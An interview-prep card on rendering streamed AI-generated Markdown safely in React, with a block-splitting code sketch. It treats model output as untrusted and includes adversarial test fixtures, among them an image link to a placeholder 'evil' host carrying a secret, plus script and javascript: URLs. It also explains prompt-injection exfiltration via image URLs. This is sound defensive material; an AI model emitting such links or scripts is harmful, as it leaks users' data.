# Render streaming Markdown safely: partial syntax, sanitization and code blocks
**Round:** 14 · AI-Powered Frontends · **Level:** Lead / Staff · **Time:** 15 min · **Tags:** markdown · streaming · sanitization
Source: https://whetstone-v1.vercel.app/#ai-frontend

Scenario: Markdown arrives token by token: half a code fence, an unfinished link, a table mid-row. Render it safely and without flicker.

## What they're really testing
Two things at once: model output is untrusted input (XSS, phishing, data exfiltration), and incremental rendering performance (avoid re-parsing everything per token).

## Core answer (key points)
- **Treat output like user-generated content:** raw HTML disabled (or sanitized with DOMPurify if truly required), link protocol allowlist (`https:`, `mailto:`, relative, anchors), never eval or inject model HTML/JS.
- **Performance:** split the text into top-level blocks (blank-line separated, but not inside a code fence). Completed blocks never change, so memoize them; only the last growing block re-parses. Turns O(n^2) into roughly O(n).
- **Partial syntax:**
  - Unclosed fence: most parsers treat the rest as code, which is the right in-progress look. Defer syntax highlighting until the fence closes; highlighting per token is expensive.
  - Half links / emphasis: render as plain text until complete; most parsers do this naturally.
  - Tables reflow as rows arrive: reserve width, or render the table once closed.
- **Code blocks:** language label, copy button, highlight after close (or in a worker for long blocks).
- **Images:** off by default or proxied. Model-produced image URLs can exfiltrate data via query strings after prompt injection.
- **Links:** `rel="noopener noreferrer"`, show the real destination on hover/focus.

## Mental model / flow
```
full text ──split (fence-aware)──▶ [b0][b1][b2]...[bN (growing)]
                                     memo  memo memo   re-render
each block ──▶ markdown parser (skipHtml, urlTransform allowlist) ──▶ React nodes
```

## Code sketch
```tsx
// Own sketch: fence-aware block split + memoized blocks
export function toBlocks(text: string): string[] {
  const out: string[] = []; let cur: string[] = []; let fenced = false;
  for (const line of text.split('\n')) {
    if (/^\s*(```|~~~)/.test(line)) fenced = !fenced;
    if (!fenced && line.trim() === '' && cur.length) { out.push(cur.join('\n')); cur = []; }
    else cur.push(line);
  }
  if (cur.length) out.push(cur.join('\n'));
  return out;
}

const safeUrl = (u: string) => (/^(https?:|mailto:|#|\/)/i.test(u) ? u : '');

const Block = memo(({ src }: { src: string }) => (
  <ReactMarkdown skipHtml urlTransform={safeUrl} components={mdComponents}>{src}</ReactMarkdown>
));

export function StreamingMarkdown({ text }: { text: string }) {
  const blocks = useMemo(() => toBlocks(text), [text]);
  // index keys are stable: blocks only ever append
  return <div className="prose">{blocks.map((b, i) => <Block key={i} src={b} />)}</div>;
}
```
`skipHtml` and `urlTransform` are react-markdown props in recent versions; verify against the version you use.

## Trade-offs & pitfalls
- A regex block splitter is heuristic: indented code, nested lists or HTML blocks can split oddly. Acceptable while streaming; you can do one final full parse at `done`.
- Sanitizing after rendering to a string and then using `dangerouslySetInnerHTML` is riskier than rendering to React elements with HTML disabled.
- Allowlists, not denylists, for protocols (`javascript:`, `data:`, `vbscript:` variants are endless).
- Syntax highlighter libraries are heavy; lazy-load them.
- Math/mermaid rendering of model output: same untrusted-input rules, sandbox if possible.

## Likely follow-ups
- **How do you test it?** Adversarial fixtures: `<script>`, `javascript:` links, `![](https://evil/?q=secret)`, unclosed fences, giant tables; snapshot the rendered DOM; property tests on random truncation points.
- **Why not render once at the end?** Kills perceived latency; streaming is the point.
- **Does CSP help?** Yes as defense in depth (block inline scripts, restrict `img-src`), but don't rely on it alone.
- **What about LaTeX/tables flicker?** Defer specialized renderers until the block is closed.

## Say it in 60 seconds
Model output is untrusted and incomplete. For safety I render Markdown with raw HTML disabled, allow only safe link protocols, add noopener and show real URLs, and keep images off or proxied because image URLs are an exfiltration channel after prompt injection. For performance, I split the text into fence-aware blocks; finished blocks are memoized so only the last, growing block re-parses on each update. Partial syntax mostly degrades gracefully: an open fence already looks like code in progress, so I just delay highlighting until it closes, and I reserve width or defer tables. And I test with adversarial fixtures and random truncation points.
